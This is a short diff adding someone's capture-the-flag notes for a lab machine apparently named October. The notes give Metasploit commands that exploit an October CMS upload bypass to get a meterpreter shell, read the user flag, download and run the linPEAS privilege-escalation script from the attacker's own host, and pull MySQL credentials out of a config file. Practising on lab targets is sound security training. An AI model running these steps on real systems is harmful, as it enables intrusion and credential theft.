@@ -1,0 +1,27 @@
+ter 1 :
+wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
+python3 -m http.server 8888
+
+ter 2 :
+sudo msfconsole
+	search october
+	use exploit/multi/http/october_upload_bypass_exec
+	set RHOSTS [IP of october machine]
+	set LHOST [IP of own machine]
+	run
+
+	-> meterpreter session
+		shell
+		cd /home/harry
+		cat user.txt
+			-> user flag here
+
+		cd /tmp
+		wget http://[IP of own machine]:8888/linpeas.sh
+		chmod +x ./linpeas.sh
+		./linpeas.sh|tee linpeas.out
+
+		//Read linpeas summary to find things, around the end see that /var/www/html/cms/config/database.php has the credentials of mysql database
+			-> mysql user : october pwd : OctoberCMSPassword!!
+
+		see official HTB write up for root
